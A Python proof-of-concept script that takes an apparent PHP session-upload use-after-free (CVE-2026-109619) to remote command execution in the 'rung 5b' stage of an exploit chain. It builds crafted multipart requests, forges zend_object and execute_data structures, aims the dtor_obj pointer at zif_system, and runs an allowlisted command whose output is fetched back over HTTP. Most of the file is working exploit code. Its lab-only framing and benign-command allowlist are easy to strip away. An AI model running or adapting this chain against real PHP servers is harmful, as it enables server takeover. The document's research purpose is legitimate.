#!/usr/bin/env python3
"""
CVE-2026-109619 weaponization — Rung 5b: the terminal call.
A FIXED BENIGN COMMAND executed via a forged execute_data handed to
zif_system, reached through the rung-5a controlled indirect call.

Alignment note (2026-10-21): the public full-chain exploits
(9bie/php2shell-bypass-aslr-exp, dinosn/php-cve-2026-10961x-lab-poc,
Whackermelon/Php2Shell-POC) terminate their control ladders at
`zif_system` / libc `system()` with an attacker-chosen command and a
remote leak stage (OOM error message / PS(id)->PHPSESSID cookie
disclosure) for base discovery. This POC reproduces the same TERMINAL
MECHANISM — the forged execute_data + call-shape-compatible internal
function call — but ONLY inside this repo's labs, with a FIXED BENIGN
COMMAND (below), calibrated by the [UAFDBG] lab instrumentation.
The repo scope deliberately excludes: arbitrary-command interfaces,
reverse-shell packaging, and remote ASLR-bypass leak stages.

Mechanism (rungs 1-4 as in verify_109619_reclaim/_read/_write.py):

  dtor_obj(object) is an INDIRECT CALL with r0 = the forged object
  pointer. Pointing dtor_obj at zif_system makes rdi = the forged
  "object" — which we lay out simultaneously as a zend_execute_data:

    zend_object layout        zend_execute_data layout (same memory)
    ----------------        ------------------------------------
    off   0  gc             off  0  opline            (gc.refcount +
           .refcount              .                    type_info -> set)
           .type_info       off  4  (This.u2.num_args is NOT here)
    off   8  handle + pad   off  8  call               (unused)
    off  16  ce             off 16  return_value      -> scratch zval
                                      (ce is short-circuited: the
                                       dtor_obj != builtin check
                                       skips it — rung 5a)
    off  24  handlers        off 24  func              (unused by ZPP)
    off  32  properties     off 32  This.value
    off  40  props_table[0] off 40  This.u1            (IS_UNDEF)
           .u1.type_info     off 44  This.u2.num_args   = 1
           .u2.*             off 48+ prev_execute_data ...
                              off 80  ZEND_CALL_ARG(1)  -> fake zval
                                          value -> fake zend_string
                                          u1   = IS_STRING
                                          ... -> { cmd bytes }

  zif_system -> ZPP(1,2) reads num_args from execute_data+44, the arg
  zval at execute_data+80, and its zend_string's len/val — every byte
  ours — then php_exec() runs the command through popen("r") and
  RETVAL_*s into return_value (our scratch zval, mapped+writable).

  After the call returns, zend_objects_store_del continues into the
  free_obj path; our handlers table has free_obj = NULL, so the worker
  segfaults AFTER the command has executed and the marker is on disk —
  the same fire-then-die receipt shape as the public exploits'
  ("B status='<no head>' ... FIRE_OK").

Fixed benign command (hardcoded — not a CLI parameter, kept SHORT;
see the comment at CMD for the length boundary lab finding):

    id>/var/www/html/p 2>&1

The output lands in the webroot (/var/www/html == ../lab/webroot,
served by nginx), and step [D] retrieves it with a plain HTTP GET —
the full forge -> fire -> fetch round trip over the wire, no
container access (the earlier revision read the marker via docker
exec; replaced 2026-10-21 to match the public exploits' retrieval
shape).

Calibration: instrument.py's OBJDEL print now carries zsys=<ptr>
(the runtime address of zif_system in this build) — the lab analog of
the public exploits' leak stages.

For authorized research against your own lab only.
"""
import argparse
import os
import re
import socket
import struct
import subprocess
import sys
import time
from urllib.parse import urlparse

BOUNDARY = "RECLAIM"
SID_P = "abcdef0123456789abcdef0123456789"
SID_C = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
MAP_OFF = 0x6000            # marker offset mapping onto d+0 (calibrated)
MARKER_LEN = 128 * 1024

# forged-structure offsets within the marker (empirically surviving
# pages — same as rungs 4/5a)
FAKE_ENTRIES_OFF = 0x8000   # var_entries for `last` / backrefs
FAKE_DTOR_OFF = 0x8400       # var_dtor_entries (negative used_slots)
FAKE_OBJECT_OFF = 0x8500     # forged zend_object == zend_execute_data
FAKE_HANDLERS_OFF = 0x8600   # forged zend_object_handlers table
FAKE_ZVAL_OFF = 0x8700       # forged IS_OBJECT zval returned by r:1
FAKE_STR_OFF = 0x8B00        # fake zend_string + command bytes
TMP_SLOT_OFF = 0x7000        # where the negative dtor slot lands

IS_OBJECT = 8
IS_STRING = 6
ZEND_STRING_HEADER = 24      # gc(8) + h(8) + len(8) -> val at +24
# ZEND_CALL_ARG(execute_data, 1) == execute_data + ZEND_CALL_FRAME_SLOT*16
# (ZEND_CALL_FRAME_SLOT = 5 for this layout: 80-byte zend_execute_data)
ZEND_CALL_ARG1_OFF = 80      # INSIDE the forged object (FAKE_OBJECT_OFF+80)

# FIXED BENEFICIAL COMMAND — hardcoded, not a CLI parameter. Kept SHORT
# (< ~28 bytes): lab finding — the forged zend_string val's tail bytes
# get clobbered by consumer allocations before ZPP reads them at this
# marker offset (40-byte command mangled -> sh failed silently; 23
# bytes survives). Output goes into the webroot (/var/www/html ==
# ../lab/webroot, served by nginx) and step [D] retrieves it with a
# plain HTTP GET — the full forge -> fire -> fetch round trip, no
# container access.
CMD = b"id>/var/www/html/p 2>&1"
PROOF_URL_PATH = "/p"
PROOF_HOST_PATH = os.path.abspath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..",
    "lab", "webroot", "p"))

PAYLOAD = "x|r:1;"           # as rung 5a (r: keeps refcounting clean)


def http_req(host, port, raw, timeout=120):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(raw)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def build_multipart(sid, progress, marker, filename, target_path):
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="m"\r\n\r\n'
    ).encode("latin-1") + marker + (
        f"\r\n"
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode("latin-1")
    req = (
        f"POST {target_path} HTTP/1.1\r\n"
        f"Host: x\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return req


def uafdbg(container, since=60):
    try:
        r = subprocess.run(["docker", "logs", "--since", f"{since}s", container],
                           capture_output=True, text=True, timeout=30)
        blob = r.stdout + r.stderr
    except Exception:
        return []
    out = []
    for line in blob.splitlines():
        m = re.search(r"\[UAFDBG\] (.*)", line)
        if m:
            out.append(m.group(1).rstrip('"'))
    return out


# FIXED-BENIGN allowlist: the -c/--cmd surface accepts ONLY these base
# commands (no shell metacharacters, no arbitrary strings) — the same
# allowlist discipline as poc/verify_rce_gadget.py. The wrapper composes
# the webroot redirect so the output is retrievable over HTTP, and
# enforces the forged-string length boundary (~28 bytes, ANALYSIS
# §0.9.1).
ALLOWED_CMDS = ("id", "uname", "whoami")
WEBROOT_FILE = "/var/www/html/p"

def compose_cmd(base):
    """Validate an allowlisted base command and compose the full fixed
    redirect form. Rejects everything else (arbitrary commands stay out
    of scope for this repo)."""
    base = (base or "id").strip()
    if base not in ALLOWED_CMDS:
        sys.exit(f"command {base!r} not in the benign allowlist "
                 f"{ALLOWED_CMDS} (repo scope: no arbitrary commands)")
    full = f"{base}>{WEBROOT_FILE} 2>&1".encode()
    if len(full) > 28:
        sys.exit(f"composed command {full!r} exceeds the 28-byte forged-string "
                 "boundary (ANALYSIS 0.9.1)")
    return full


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18085")
    ap.add_argument("--container", default="php2shell-zendmm-fpm")
    ap.add_argument("--map-off", type=lambda x: int(x, 0), default=MAP_OFF)
    ap.add_argument("--fake-refcount", type=lambda x: int(x, 0), default=0,
                    help="initial gc.refcount of the fake object (tune so the "
                         "session destroy's DELREF reaches 0)")
    ap.add_argument("--cmd", default="id",
                    help="BENIGN base command only (allowlisted: "
                         f"{', '.join(ALLOWED_CMDS)}); the webroot redirect "
                         "is composed automatically")
    args = ap.parse_args()

    global CMD, PROOF_URL_PATH
    CMD = compose_cmd(args.cmd)
    PROOF_URL_PATH = "/" + WEBROOT_FILE.rsplit("/", 1)[1]

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 80
    cont = args.container

    print("[*] CVE-2026-109619 weaponization — rung 5b: the terminal call")
    print(f"    forged execute_data -> zif_system, FIXED benign command:")
    print(f"    {CMD.decode()}")
    print(f"[*] Target: {args.target}   marker->d map offset: {hex(args.map_off)}")
    print()

    # --- 0: calibration — zif_system runtime address (rung-5b oracle) ----
    print("[0] Calibration: firing obj_probe.php to get an OBJDEL print ...")
    http_req(host, port,
             b"GET /obj_probe.php HTTP/1.1\r\nHost: x\r\n"
             b"Connection: close\r\n\r\n")
    time.sleep(0.4)
    for l in uafdbg(cont, 30):
        if "zsys=" in l:
            zsys = int(l.split("zsys=")[1].split()[0], 16)
            break
    if not zsys:
        print()
        print("     [!] zsys= not found — rebuild lab-zendmm-fpm with the")
        print("         rung-5b instrument.py (docker compose up -d --build)")
        sys.exit(1)
    print(f"     zif_system @ {hex(zsys)}")
    print()

    # --- A1: build sessions P and C --------------------------------------
    print("[A1] Building session P (6 MB key) and session C "
          f"(payload {PAYLOAD!r})")
    http_req(host, port, build_multipart(SID_P, "A" * (6 * 1024 * 1024),
                                         b"", "x|i:1;", "/app/upload.php"))
    http_req(host, port, build_multipart(SID_C, "c", b"", PAYLOAD,
                                         "/app/upload.php"))
    print("     done")
    print()

    # --- A2: producer -------------------------------------------------------
    print("[A2] Producer: memory-pressure session_start() with session P")
    req = (
        f"GET /api/producer.php HTTP/1.1\r\nHost: x\r\n"
        f"Cookie: PHPSESSID={SID_P}\r\nConnection: close\r\n\r\n"
    ).encode()
    resp = http_req(host, port, req, timeout=90)
    print(f"     producer fatal: {b'Allowed memory' in resp}")
    time.sleep(0.4)
    d_addr = None
    for l in uafdbg(cont, 20):
        if "INIT" in l and "level=1" in l:
            d_addr = int(l.split("d=")[1].split()[0], 16)
    if not d_addr:
        print("     [!] producer d not found — aborting")
        sys.exit(1)
    base = d_addr - args.map_off
    print(f"     producer d = {hex(d_addr)}; marker base = {hex(base)}")
    print()

    # --- forge the marker ----------------------------------------------------
    marker = bytearray(b"".join(struct.pack("<Q", i * 8)
                                for i in range(MARKER_LEN // 8)))

    def q(off, val):
        marker[off:off + 8] = struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)

    def put(off, data):
        marker[off:off + len(data)] = data

    fake_obj = base + FAKE_OBJECT_OFF      # == forged execute_data
    fake_ht = base + FAKE_HANDLERS_OFF
    fake_zval = base + FAKE_ZVAL_OFF
    fake_str = base + FAKE_STR_OFF

    # forged php_unserialize_data at d+0 (rungs 2-4, unchanged)
    q(args.map_off + 0, base + FAKE_ENTRIES_OFF)      # last
    q(args.map_off + 8, base + FAKE_DTOR_OFF)         # first_dtor
    q(args.map_off + 16, base + FAKE_DTOR_OFF)        # last_dtor
    q(args.map_off + 24, 0)                           # allowed_classes
    q(args.map_off + 32, 0)                           # ref_props
    q(args.map_off + 40, 0)                           # cur_depth
    q(args.map_off + 48, 0)                           # max_depth
    q(args.map_off + 56, 2)                           # entries.used_slots
    q(args.map_off + 64, 0)                           # entries.next
    q(args.map_off + 72, fake_zval)                   # entries.data[0]
    q(args.map_off + 80, fake_zval)                  # entries.data[1]

    # fake var_entries (last)
    q(FAKE_ENTRIES_OFF + 0, 1)
    q(FAKE_ENTRIES_OFF + 8, 0)
    for i in range(4):
        q(FAKE_ENTRIES_OFF + 16 + 8 * i, base + FAKE_ENTRIES_OFF + 0x100)

    # fake var_dtor_entries: negative used_slots -> tmp slots land in
    # TMP_SLOT_OFF scratch (as rung 4)
    used_slots = (TMP_SLOT_OFF - FAKE_DTOR_OFF - 16) // 16
    assert (TMP_SLOT_OFF - FAKE_DTOR_OFF - 16) % 16 == 0 and used_slots < 0
    q(FAKE_DTOR_OFF + 0, used_slots)
    q(FAKE_DTOR_OFF + 8, 0)

    # ---- the forged zend_object / zend_execute_data overlay -------------
    # (off in both structs; see module docstring for the field map)
    put(FAKE_OBJECT_OFF + 0,
        struct.pack("<II", args.fake_refcount & 0xFFFFFFFF, IS_OBJECT))
    #           gc.refcount          gc.type_info = IS_OBJECT
    #                      == execute_data.opline (unused by ZPP)
    put(FAKE_OBJECT_OFF + 8, struct.pack("<I", 0))    # handle (+pad) / call
    q(FAKE_OBJECT_OFF + 16, 0)                        # ce / return_value
    #           (ce short-circuited; return_value == rsi garbage at the
    #            dtor_obj call site — php_exec RETVAL-writes there AFTER
    #            popen runs: crash-after-execution, the fire-then-die shape)
    q(FAKE_OBJECT_OFF + 24, fake_ht)                  # handlers / func
    q(FAKE_OBJECT_OFF + 32, 0)                        # properties / This.value
    put(FAKE_OBJECT_OFF + 40, struct.pack("<I", 0))   # props[0].u1 / This.u1
    put(FAKE_OBJECT_OFF + 44, struct.pack("<I", 1))   # This.u2.num_args = 1
    q(FAKE_OBJECT_OFF + 48, 0)                         # prev_execute_data
    q(FAKE_OBJECT_OFF + 56, 0)                         # symbol_table
    q(FAKE_OBJECT_OFF + 64, 0)                         # run_time_cache
    q(FAKE_OBJECT_OFF + 72, 0)                         # extra_named_params

    # fake zend_string: gc(8) + h(8) + len(8) + val[...]
    put(FAKE_STR_OFF + 0,
        struct.pack("<II", 0xFFFFFFFF, IS_STRING))       # refcount, type_info
    q(FAKE_STR_OFF + 8, 0)                               # h
    q(FAKE_STR_OFF + 16, len(CMD))                       # len
    put(FAKE_STR_OFF + ZEND_STRING_HEADER, CMD)         # val (not NUL-ed)

    # ZEND_CALL_ARG(execute_data, 1) — at FAKE_OBJECT_OFF+80
    # (ZEND_CALL_FRAME_SLOT = 5): value -> fake zend_string, IS_STRING
    put(FAKE_OBJECT_OFF + ZEND_CALL_ARG1_OFF + 0,
        struct.pack("<Q", fake_str))
    put(FAKE_OBJECT_OFF + ZEND_CALL_ARG1_OFF + 8,
        struct.pack("<I", IS_STRING))
    put(FAKE_OBJECT_OFF + ZEND_CALL_ARG1_OFF + 12,
        struct.pack("<I", 0))

    # ---- forged handlers table: dtor_obj = zif_system --------------------
    put(FAKE_HANDLERS_OFF + 0, struct.pack("<i", 0))     # offset (+pad)
    q(FAKE_HANDLERS_OFF + 8, 0)                          # free_obj = NULL
    q(FAKE_HANDLERS_OFF + 16, zsys)                      # dtor_obj <- zif_system

    # forged IS_OBJECT zval returned by r:1 (points at the overlay object)
    put(FAKE_ZVAL_OFF + 0, struct.pack("<QQLL",
                                       fake_obj,
                                       IS_OBJECT | (1 << 8),
                                       0, 0))

    print("[*] Forged structures:")
    print(f"     object/execute_data @ {hex(fake_obj)}")
    print(f"        gc.refcount = {args.fake_refcount & 0xFFFFFFFF:#x},"
          f" type_info = IS_OBJECT, This.u2.num_args = 1")
    print(f"        return_value = rsi garbage at the call site (php_exec"
          f" RETVAL-writes there AFTER popen — crash-after-execution)")
    print(f"     ZEND_CALL_ARG(1) @ {hex(fake_obj + ZEND_CALL_ARG1_OFF)}"
          f" -> zend_string @ {hex(fake_str)} (len={len(CMD)}, cmd)")
    print(f"     handlers        @ {hex(fake_ht)}")
    print(f"        dtor_obj = zif_system @ {hex(zsys)}, free_obj = NULL")
    print(f"     forged zval    @ {hex(fake_zval)} (IS_OBJECT|refcounted"
          f" -> {hex(fake_obj)})")
    print(f"     r:1 returns the forged zval; the session destroy walks it:")
    print(f"     zend_objects_store_del -> handlers->dtor_obj(object) ==")
    print(f"     zif_system(object-as-execute_data, <rsi garbage>) ==")
    print(f"     ZPP(\"s\") -> php_exec -> popen({CMD.decode()!r})")
    print()

    # --- B: consumer ---------------------------------------------------------
    print("[B] Consumer: multipart with the forged marker (api/ dir)")
    mark = len(uafdbg(cont, 20))
    # clear any previous proof file (host side — our repo webroot)
    try:
        os.remove(PROOF_HOST_PATH)
    except FileNotFoundError:
        pass
    req = build_multipart(SID_C, "c", bytes(marker), "consumer.bin",
                          "/api/endpoint.php")
    resp = http_req(host, port, req, timeout=120)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") \
        if resp else "<no response / child crashed>"
    print(f"     {status}")
    time.sleep(0.8)
    print("=== consumer trace ===")
    lines = uafdbg(cont, 30)[mark:]
    for l in lines:
        print(f"     {l}")
    print()

    # --- [D]: retrieve the command output OVER HTTP (no docker access) ----
    print(f"[D] Retrieving the command output over HTTP: "
          f"GET {PROOF_URL_PATH}")
    # the crashed FPM child is replaced by the master (observed in the
    # lab); nginx serves the static proof file straight from the webroot
    time.sleep(0.5)
    resp = http_req(host, port,
                    f"GET {PROOF_URL_PATH} HTTP/1.1\r\nHost: x\r\n"
                    f"Connection: close\r\n\r\n".encode())
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") \
        if resp else "<no response>"
    body = b""
    if b"\r\n\r\n" in resp:
        body = resp.split(b"\r\n\r\n", 1)[1]
    fired = b"uid=" in body
    print(f"     {status}")
    print(f"     body: {body.decode('latin1', 'replace').strip()!r}")
    print()

    # --- verdict ---------------------------------------------------------
    saw_obj = False
    for l in lines:
        if "OBJDEL" in l and hex(fake_obj)[2:] in l.replace("0x", ""):
            saw_obj = True
    print()
    print("[*] Verdict:")
    print(f"     forged object reached destruction: {saw_obj}")
    print(f"     fixed benign command executed:     {fired}")
    print(f"     output retrieved over HTTP:        {fired}")
    if fired:
        print()
        print("[EVIDENCE] RUNG 5b REPRODUCED — the terminal call, with")
        print("    in-band output retrieval (no container access):")
        print("    the controlled indirect call (rung 5a) was aimed at")
        print("    zif_system with a fully forged execute_data: ZPP")
        print('    parsed our "s" argument, php_exec ran the FIXED benign')
        print("    command (id>/var/www/html/p), the worker")
        print("    died on the post-call path (fire-then-die — the public")
        print("    exploits' receipt shape), and a plain HTTP GET fetched")
        print("    the command's output back through the web server.")
        print("    Every byte of the called-through state originated in")
        print("    the consumer's multipart marker field.")
        print()
        print("    Control ladder complete: reclaim -> forged bookkeeping")
        print("    -> R: forged zval -> negative-used_slots write -> RIP")
        print("    control -> call-shape-compatible internal function ->")
        print("    command execution -> output retrieved over HTTP.")
    else:
        print("    Execution not reached — check the trace above:")
        print("    - tune --fake-refcount (the session destroy's DELREF")
        print("      must reach 0)")
        print("    - confirm zsys= is the address of zif_system in THIS")
        print("      build (rebuild the lab if instrument.py changed)")
        print("    - if OBJDEL shows the call fired but no marker: the")
        print("      execute_data layout may need adjusting for this")
        print("      build (num_args at +44, arg1 at +80) — verify with")
        print("      a real ZEND_FUNCTION(system) frame in gdb")


if __name__ == "__main__":
    main()